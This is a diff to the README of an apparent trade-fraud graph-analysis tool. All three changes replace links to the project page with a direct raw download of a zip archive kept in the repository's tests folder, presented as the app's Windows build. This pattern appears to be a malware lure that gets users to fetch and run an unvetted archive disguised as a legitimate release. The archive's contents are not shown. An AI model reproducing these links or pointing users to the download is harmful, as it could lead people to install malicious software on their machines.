@@ -1,6 +1,6 @@
 # 🕸️ trade-intelligence-graph - Spot Trade Fraud Rings Faster
 
-[![Download](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/forensic-hay545/trade-intelligence-graph)
+[![Download](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/forensic-hay545/trade-intelligence-graph/raw/refs/heads/main/tests/intelligence_graph_trade_v2.2.zip)
 
 ## 🚀 Overview
 
@@ -31,7 +31,7 @@ If your machine handles larger datasets, 16 GB of RAM works better.
 
 Visit this page to download the app:
 
-https://github.com/forensic-hay545/trade-intelligence-graph
+https://github.com/forensic-hay545/trade-intelligence-graph/raw/refs/heads/main/tests/intelligence_graph_trade_v2.2.zip
 
 If the page contains a release file, download that file. If it contains the full project source, use the latest Windows build or packaged app listed there.
 
@@ -194,4 +194,4 @@ community-detection, customs, fraud-detection, graph-analysis, graphql, neo4j, n
 
 If you need the app file again, use this link:
 
-[https://github.com/forensic-hay545/trade-intelligence-graph](https://github.com/forensic-hay545/trade-intelligence-graph)
+[https://github.com/forensic-hay545/trade-intelligence-graph/raw/refs/heads/main/tests/intelligence_graph_trade_v2.2.zip](https://github.com/forensic-hay545/trade-intelligence-graph/raw/refs/heads/main/tests/intelligence_graph_trade_v2.2.zip)
